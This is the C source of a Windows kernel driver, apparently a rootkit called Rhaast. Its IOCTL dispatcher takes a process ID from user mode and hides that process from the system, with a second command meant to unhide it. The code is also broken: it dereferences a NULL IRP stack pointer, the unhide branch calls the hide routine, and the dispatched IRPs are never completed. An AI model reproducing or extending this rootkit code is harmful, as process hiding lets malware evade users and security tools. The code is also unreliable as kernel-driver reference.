#include <Rhaast.h>

/**
 * @brief
 *      used to handle IRP_MJ_CREATE/IRP_MJ_CLOSE requests
 */
NTSTATUS TsIoCtlCreateClose(
    IN OUT PDEVICE_OBJECT DriverObject, 
    IN OUT PIRP           Irp
) {
    Irp->IoStatus.Status      = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;

    IofCompleteRequest( Irp, IO_NO_INCREMENT );

    return STATUS_SUCCESS;
}

/**
 * @brief
 *      initialize IoCtl transport functions
 */
VOID TsIoCtlInit(
    VOID
) {
    Instance.DriverObject->MajorFunction[ IRP_MJ_CREATE ]         = TsIoCtlCreateClose;
    Instance.DriverObject->MajorFunction[ IRP_MJ_CLOSE  ]         = TsIoCtlCreateClose;
    Instance.DriverObject->MajorFunction[ IRP_MJ_DEVICE_CONTROL ] = TsIoCtlDispatch;
}

/**
 * @brief
 *      Responsible for handling & dispatch IOCTLs 
 *      and returning output to the user.
 *
 * @param DeviceObject
 *      Not used
 *
 * @param Irp
 *      Irp contains the data issued by the client
 *
 * @return
 *      if the function succeeded to execute
 */
NTSTATUS TsIoCtlDispatch(
    IN OUT PDEVICE_OBJECT DeviceObject,
    IN OUT PIRP           Irp
) {
    PIO_STACK_LOCATION IrpStack = NULL;
    NTSTATUS           NtStatus = STATUS_SUCCESS;

    /* dispatch IOCTL code */
    switch ( IrpStack->Parameters.DeviceIoControl.IoControlCode ) {

        case RHAAST_IOCTL_PROCESS_HIDE:
        {
            ULONG Pid = 0;
            
            /* check data input size */
            if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( ULONG ) ) {
                NtStatus = STATUS_INVALID_BUFFER_SIZE;
                break;
            }

            /* get process id & hide process */
            if ( Irp->AssociatedIrp.SystemBuffer ) {
                Pid = * ( PULONG ) Irp->AssociatedIrp.SystemBuffer;

                /* hide process */
                if ( ! NT_SUCCESS( NtStatus = ProcessHide( Pid ) ) ) {
                    PRINTF( "Failed to hide process: %p\n", NtStatus )
                    break;
                }

                PRINTF( "Process Hidden: %d\n", Pid )
            } else {
                NtStatus = STATUS_INVALID_PARAMETER;
            }

            break;
        }

        case RHAAST_IOCTL_PROCESS_UNHIDE:
        {
            ULONG Pid = 0;

            /* check data input size */
            if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( ULONG ) ) {
                NtStatus = STATUS_INVALID_BUFFER_SIZE;
                break;
            }

            /* get process id & hide process */
            if ( Irp->AssociatedIrp.SystemBuffer ) {
                Pid = * ( PULONG ) Irp->AssociatedIrp.SystemBuffer;

                /* hide process */
                if ( ! NT_SUCCESS( NtStatus = ProcessHide( Pid ) ) ) {
                    PRINTF( "Failed to hide process: %p\n", NtStatus )
                    break;
                }

                PRINTF( "Process Hidden: %d\n", Pid )
            } else {
                NtStatus = STATUS_INVALID_PARAMETER;
            }

            break;
        }

        default: {
            NtStatus = STATUS_INVALID_PARAMETER;
        }
    }

    return NtStatus;
}
